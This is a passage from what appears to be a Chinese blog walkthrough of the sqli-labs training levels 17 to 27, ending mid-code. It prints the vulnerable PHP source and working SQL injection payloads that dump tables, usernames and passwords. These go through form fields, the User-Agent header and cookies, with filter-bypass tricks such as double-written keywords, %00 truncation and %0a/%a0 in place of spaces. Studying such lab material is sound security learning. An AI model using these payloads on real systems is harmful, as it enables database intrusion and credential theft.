class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>addslashes() 函数，这是个什么东西呢？<br> addslashes()函数：一个会在预定义字符之前添加反斜杠的函数，即会帮助转义</p>
<p>预定义字符有：</p>
<ul>
<li>单引号(’)</li>
<li>双引号(“)</li>
<li>反斜杠()</li>
<li>NULL</li>
</ul>
<p>所以在平时过程中，咱就不用手动加转义字符了，但怕有些人进行了双层转义，所以可以使用 get_magic_quotes_gpc() 来进行检测，其参数为 string，string类型，内容为规定要转义的字符串，该函数返回内容为已转义的字符串，该函数适用于 PHP 版本 4.0+</p>
<p>第三个要介绍的就是 stripslashes() 函数，该函数可以删除 addslashes() 函数添加的反斜杠</p>
<p>最后就是 mysql_real_escape_string() 函数：<br> 它将转义 SQL 语句中使用的字符串中的特殊字符</p>
</blockquote>
<p>那么我们想到能不能对passwd这个参数做一些注入。</p>
<p>我们知道，修改密码用到的是UPDATE，类似于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;</span><br></pre></td></tr></table></figure>

<p>那么，我们的union就不再管用了：</p>
<p><img src="/2020/09/26/sql-labs/17_2.png" alt="17_2"></p>
<p>那就想到是否可以报错型注入：</p>
<p><img src="/2020/09/26/sql-labs/17_3.png" alt="17_3"></p>
<p>但是用floor注入的时候就遇到了一些问题：</p>
<p><img src="/2020/09/26/sql-labs/17_4.png" alt="17_4"></p>
<ol>
<li><p>首先用and不可以，会报错：Truncated incorrect DOUBLE value: ‘Dick’【后来发现把Dick这种字母改成数字就完全没有问题了】</p>
</li>
<li><p>其次select的数字必须是一列，可能是因为update本身就修改一列的数据。这样就屏蔽了另外一种floor报错【不用别名而要请求多列的】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update sql_4 SET name&#x3D;&#39;Dick&#39; where (select 1,count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x);</span><br></pre></td></tr></table></figure>

<p>因为count(*)和concat的内容最少也需要两列</p>
</li>
</ol>
<h3 id="有趣的发现3"><a href="#有趣的发现3" class="headerlink" title="有趣的发现3"></a>有趣的发现3</h3><blockquote>
<p><img src="/2020/09/26/sql-labs/17_6.png" alt="17_6"></p>
<p>这里用数字就可以，用字母就不可以，我也不晓得为什么</p>
</blockquote>
<h3 id="遗留疑惑2【见有趣的发现3】"><a href="#遗留疑惑2【见有趣的发现3】" class="headerlink" title="遗留疑惑2【见有趣的发现3】"></a>遗留疑惑2【见有趣的发现3】</h3><p>于是我们就可以开始构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),0x7e),1) #</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),floor(rand(0)*2))x from information_schema.schemata group by x)a)#</span><br></pre></td></tr></table></figure>

<p>但是当我们构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1) #</span><br></pre></td></tr></table></figure>

<p>会报错：</p>
<p><img src="/2020/09/26/sql-labs/17_7.png" alt="17_7"></p>
<p>测试里同样出现了这种问题：【后来发现只是我前面做update题时把他全改成xxx了，不是加密。。。想多了】</p>
<p><img src="/2020/09/26/sql-labs/17_8.png" alt="17_8"></p>
<p>我们试着多构造一层【记得取别名！！！】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)a),0x7e),1) #</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and (select 1 from (select count(*),concat((select username from (select username from users limit 0,1)a),floor(rand(0)*2))x from information_schema.schemata group by x)a)#</span><br></pre></td></tr></table></figure>



<h3 id="遗留疑惑3"><a href="#遗留疑惑3" class="headerlink" title="遗留疑惑3"></a>遗留疑惑3</h3><blockquote>
<p><img src="/2020/09/26/sql-labs/17_9.png" alt="17_9"></p>
<p>当多构造的一层和里面一层select的对象不同的时候，会这样报错：Only constant XPATH queries are supported</p>
</blockquote>
<h2 id="No-18【http头uagent注入】"><a href="#No-18【http头uagent注入】" class="headerlink" title="No.18【http头uagent注入】"></a>No.18【http头uagent注入】</h2><p>这一关就和之前完全不一样了，首先看一下源代码，发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname &#x3D; check_input($con, $_POST[&#39;uname&#39;]);</span><br><span class="line">$passwd &#x3D; check_input($con, $_POST[&#39;passwd&#39;]);</span><br></pre></td></tr></table></figure>

<p>我们不可能从用户名和密码这个注入点注入了，所以继续观察发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uagent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">$IP &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line"></span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;Your User Agent is: &#39; .$uagent;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/18_1.png" alt="18_1"></p>
<p>我们用bp抓一个包试试看：</p>
<p><img src="/2020/09/26/sql-labs/18_2.png" alt="18_2"></p>
<p>我们发现，这两个东西是一样，也就是insert里的uagent，我们就想到把这个地方当作一个注入点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</span><br><span class="line">我们把uagent的值设为：1&#39;,1,1)#，这句就变成了：</span><br><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;1&#39;,1,1)#</span><br><span class="line">这里就是我们的注入点</span><br></pre></td></tr></table></figure>

<p>我们可以构造爆库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆值：[变换n的值来爆不同的值]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from security.users limit n,1),0x7e),1))#</span><br></pre></td></tr></table></figure>





<h2 id="No-19【http头referer注入】"><a href="#No-19【http头referer注入】" class="headerlink" title="No.19【http头referer注入】"></a>No.19【http头referer注入】</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uagent &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">$IP &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line"></span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;referers&#96; (&#96;referer&#96;, &#96;ip_address&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;Your Referer is: &#39; .$uagent;</span><br></pre></td></tr></table></figure>

<p><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];</code>这个就代表http头里的referer字段</p>
<h3 id="遗留疑惑3-1"><a href="#遗留疑惑3-1" class="headerlink" title="遗留疑惑3"></a>遗留疑惑3</h3><blockquote>
<p>这个按道理说应该是按照18关的方法，改到referer上面就可以了，网上也都是这么说的，可是本地sqllabs似乎有点问题，一直没有回显，这道题就先放着。</p>
<p><img src="/2020/09/26/sql-labs/19_1.png" alt="19_1"></p>
</blockquote>
<h2 id="No-20【cookie注入】"><a href="#No-20【cookie注入】" class="headerlink" title="No.20【cookie注入】"></a>No.20【cookie注入】</h2><p>这一关我们直接查看源代码，发现以下关键性代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee &#x3D; $_COOKIE[&#39;uname&#39;];</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;&#39;$cookee&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>这样就和之前最简单的单引号注入一样了，我们直接bp改cookie：</p>
<p><img src="/2020/09/26/sql-labs/20_1.png" alt="20_1"></p>
<p>然后像No.1一样慢慢爆出来就行了。</p>
<p><img src="/2020/09/26/sql-labs/20_2.png" alt="20_2"></p>
<p>当然，布尔注入，报错注入，时间注入也都是OK的。</p>
<h2 id="No-21【base64加密】"><a href="#No-21【base64加密】" class="headerlink" title="No.21【base64加密】"></a>No.21【base64加密】</h2><p>先正常输入用户名和密码得到：</p>
<p><img src="/2020/09/26/sql-labs/21_1.png" alt="21_1"></p>
<p>其中：<code>YWRtaW4=</code>解码之后是admin，然后连上bp，发现cookie确实是这个。</p>
<p>我们就试着把注入语句通过base64加密之后放到cookie的uname里。</p>
<p>首先admin’加密后得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#39;&#39;admin&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39;admin&#39;&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>即可发现该注入是单引号加单括号注入。</p>
<p>接着就像No.1那关一步步加密后，放到cookie里面即可。</p>
<p><img src="/2020/09/26/sql-labs/21_2.png" alt="21_2"></p>
<h2 id="No-22"><a href="#No-22" class="headerlink" title="No.22"></a>No.22</h2><p>大体上和刚才差不多。</p>
<p>admin’发现不报错，应该就是和双引号有关的注入点，一测果然就是双引号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use near &#39;&quot;admin&quot;&quot; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>还是base64加密之后放入cookie里就好了。</p>
<h2 id="No-23【过滤注释符】"><a href="#No-23【过滤注释符】" class="headerlink" title="No.23【过滤注释符】"></a>No.23【过滤注释符】</h2><p>先测试出是单引号报错，但是<code>?id=1 #</code>还是报错，推测是<code>#</code>和<code>--+</code>被过滤，一看源码果然是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;filter the comments out so as to comments should not work</span><br><span class="line">$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;</span><br><span class="line">$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;</span><br><span class="line">$replace &#x3D; &quot;&quot;;</span><br><span class="line">$id &#x3D; preg_replace($reg, $replace, $id);</span><br><span class="line">$id &#x3D; preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>既然我们无法注释消除后面的引号，那么我们就通过闭合它来完成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">这样这条语句就变成了：</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;1&#39; and &#39;1&#39;&#x3D;&#39;1&#39; LIMIT 0,1</span><br><span class="line">&#39;1&#39;&#x3D;&#39;1&#39;是一条永真语句，所以对查询结果并无影响，要union什么就在and前面添加就行了。</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">?id&#x3D;1&#39; union select 1,2,&#39;3</span><br><span class="line">将3闭合</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;1&#39; union select 1,2,&#39;3&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>



<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
<p>有一些比较低版本的MySQL可以使用%00截断，类似于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1&#39; union select 1,database(),3; %00</span><br></pre></td></tr></table></figure>

<p>测试结果如下：</p>
<p><img src="/2020/09/26/sql-labs/23_1.png" alt="23_1"></p>
<p>发现%00截断了后面的内容，无论在后面加什么奇怪的字符，都相当于没有，；也不行：</p>
<p><img src="/2020/09/26/sql-labs/23_2.png" alt="23_2"></p>
</blockquote>
<p>接下来就像No.1一样注入就行了,但是有一点要注意一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users and &#39;1&#39; &#x3D; &#39;1</span><br></pre></td></tr></table></figure>


<p>这样好像不太行：</p>
<p><img src="/2020/09/26/sql-labs/D:%5Cgitblog%5C1%5Csource_posts%5Csql-labs%5C23_3.png" alt="23_3"></p>
<p>只能像这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(password) from security.users ),3 and &#39;1&#39; &#x3D; &#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/23_4.png" alt="23_4"></p>
<p>或者用%00截断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users ;%00</span><br></pre></td></tr></table></figure>





<h2 id="No-24【遗留】"><a href="#No-24【遗留】" class="headerlink" title="No.24【遗留】"></a>No.24【遗留】</h2><p>这关出了点小问题，双admin都登不上去，先放一放。</p>
<h2 id="No-25【绕and-or】"><a href="#No-25【绕and-or】" class="headerlink" title="No.25【绕and/or】"></a>No.25【绕and/or】</h2><p><img src="/2020/09/26/sql-labs/D:%5Cgitblog%5C1%5Csource_posts%5Csql-labs%5C25_1.png" alt="25_1"></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$id= blacklist($id);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>这一关过滤了所有的 and 和 or，第一眼觉得问题不大，但后来发现其他一些东西也被过滤了，比如order,information_schema里面都含有or。</p>
<p>其实也很简单，就是一个双写绕过，比如and写成anandd，or写成oorr。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39; aandnd table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>







<blockquote>
<p>本关考察对or和and的过滤，一般几个思路：</p>
<ol>
<li>大小写变形Or OR oR</li>
<li>编码，hex，urlencode</li>
<li>添加注释<code>/*or*/</code>，o/**/r</li>
<li>and = &amp;&amp;、or = ||</li>
<li>重复 oorr、aandnd</li>
</ol>
</blockquote>
<h2 id="No-25a"><a href="#No-25a" class="headerlink" title="No.25a"></a>No.25a</h2><p>和No.25几乎一样，只是<code>?id=1&#39;</code>换成了<code>?id=1</code></p>
<h2 id="No-26【过滤空格和常见字符】"><a href="#No-26【过滤空格和常见字符】" class="headerlink" title="No.26【过滤空格和常见字符】"></a>No.26【过滤空格和常见字符】</h2><p><img src="/2020/09/26/sql-labs/D:%5Cgitblog%5C1%5Csource_posts%5Csql-labs%5C26_1.png" alt="26_1"></p>
<p>这波过滤了空格和一系列字符，看了源码发现是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$id= blacklist($id);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes【斜线】</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>鉴于正常注入字符不太好调整成无过滤字符，我们这关使用报错注入：</p>
<p>爆库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(database()),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(&#39;security&#39;)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema)like(&#39;security&#39;)anandd(table_name)like(&#39;users&#39;)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>爆具体数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>但是发现数据出来的不全：</p>
<p><img src="/2020/09/26/sql-labs/26_2.png" alt="26_2"></p>
<p>这里想到用<code>limit 0,1</code>,但是发现还是有空格，那么想到加where(id=n)，所以：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)where(id&#x3D;1)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>



<h2 id="No-26a"><a href="#No-26a" class="headerlink" title="No.26a"></a>No.26a</h2><p>先测试注入点：</p>
<p><code>?id=1&#39;</code>无回显，证明此题不回显语法错误</p>
<p><code>?id=1&quot;</code>正常回显id=1用户，证明此题是单引号为主体</p>
<blockquote>
<p>判断小括号有几种方法：</p>
<ol>
<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
</ol>
<ul>
<li>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</li>
<li>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</li>
</ul>
<ol>
<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）</li>
</ol>
</blockquote>
<h3 id="查看被过滤字符的python脚本"><a href="#查看被过滤字符的python脚本" class="headerlink" title="查看被过滤字符的python脚本"></a>查看被过滤字符的python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span><span class="params">(num)</span>:</span></span><br><span class="line">    tmp = hex(i).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> len(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">'0'</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%"</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    name = urllib.parse.unquote(i)</span><br><span class="line">    </span><br><span class="line">    url = <span class="string">"http://localhost/Sql-labs/Less-26a/?id="</span> + i </span><br><span class="line">    res = req.get(url).text</span><br><span class="line">    start = res.find(<span class="string">'Your Input is Filtered with following result:'</span>)</span><br><span class="line">    value = res[start+<span class="number">46</span>:start+<span class="number">47</span>]</span><br><span class="line">    <span class="keyword">if</span> value!=name:</span><br><span class="line">        print(<span class="string">"you cannot use "</span> + i + <span class="string">":"</span> + name)</span><br></pre></td></tr></table></figure>

<p>这个脚本跑出来是这样：</p>
<p><img src="/2020/09/26/sql-labs/26_3.png" alt="26_3"></p>
<h3 id="代替空格的url编码"><a href="#代替空格的url编码" class="headerlink" title="代替空格的url编码"></a>代替空格的url编码</h3><blockquote>
<ul>
<li><code>%09</code> TAB 键（水平）</li>
<li><code>%0a</code> 新建一行</li>
<li><code>%0b</code> TAB 键（垂直）</li>
<li><code>%0c</code> 新的一页</li>
<li><code>%0d</code> return 功能</li>
<li><code>%a0</code> 空格</li>
</ul>
</blockquote>
<p>可以看出，除了%a0以外全部被过滤，那么我们就可以用%a0来代替空格</p>
<h3 id="遗留疑惑4"><a href="#遗留疑惑4" class="headerlink" title="遗留疑惑4"></a>遗留疑惑4</h3><p>这里windows对%a0的转义有点问题，所以按照答案做的也不能爆出字段，暂时搁置。</p>
<h2 id="No-27【过滤select和union】"><a href="#No-27【过滤select和union】" class="headerlink" title="No.27【过滤select和union】"></a>No.27【过滤select和union】</h2><p>首先测试发现是单引号注入点，然后测试发现过滤字符：</p>
<p><img src="/2020/09/26/sql-labs/27_1.png" alt="27_1"></p>
<p>测试发现可以用%0a代替空格，and也没有被过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">?id&#x3D;0&#39;%0auniOn%0aseLect%0a1,database(),3%0aand &#39;1&#39;&#x3D;&#39;1			&#x2F;&#x2F;大小写绕过select和union</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">直接报错注入：</span><br><span class="line">?id&#x3D;-1&#39;and(updatexml(1,concat(0x7e,(database()),0x7e),1))and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>看一下源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;strip out &#x2F;*</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out --.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);			&#x2F;&#x2F;Strip out #.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;m&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[ 